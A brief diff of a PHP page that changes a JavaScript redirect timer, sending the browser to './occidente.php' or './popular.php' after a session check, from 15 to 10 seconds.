@@ -53,7 +53,7 @@ if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){
 setTimeout(function() {
   window.location.href = "./occidente.php";
   window.location.href = "./popular.php";
-}, 15000);
+}, 10000);
 
 </script>
 
